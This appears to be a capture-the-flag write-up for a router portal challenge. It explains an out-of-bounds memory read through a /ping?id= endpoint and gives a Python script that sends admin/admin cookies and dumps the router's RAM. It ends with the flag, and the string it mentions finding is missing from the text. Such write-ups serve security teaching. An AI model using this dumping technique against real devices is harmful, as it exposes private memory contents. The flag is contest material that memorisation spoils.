TL;DR
The webpage provides an interface to a router, which includes a ping functionality.

Using the /ping?id= endpoint, we get the base64-encoded result of each ping request. Using a sufficiently large id, we could get an out-of-bound memory read.
Solution
By enumerating the id, we would find that the ID range that corresponds to the router's RAM is from 18446744073709551463 to 18446744073709551615. We could dump out the entire RAM this way.
```python
import requests
import base64
URL = "http://router-mlb4ta7v3lwam.shellweplayaga.me:31337/ping?id="
cookies = {'password': 'admin', 'username': 'admin'}
id = 18446744073709551463
decoded = b""
for i in range(152):
    r = requests.get(f"{URL}{id+i}", cookies=cookies)
    data = r.json()
    res = data["result"]
    decoded += base64.b64decode(res)
with open("out.bin", "wb+") as f:
    f.write(decoded)
```
We would find the following string:

and guess that the flag is
FLAG{r0uter_p0rtals_are_ultimately_impenetrable_because_they_are_real_weird}
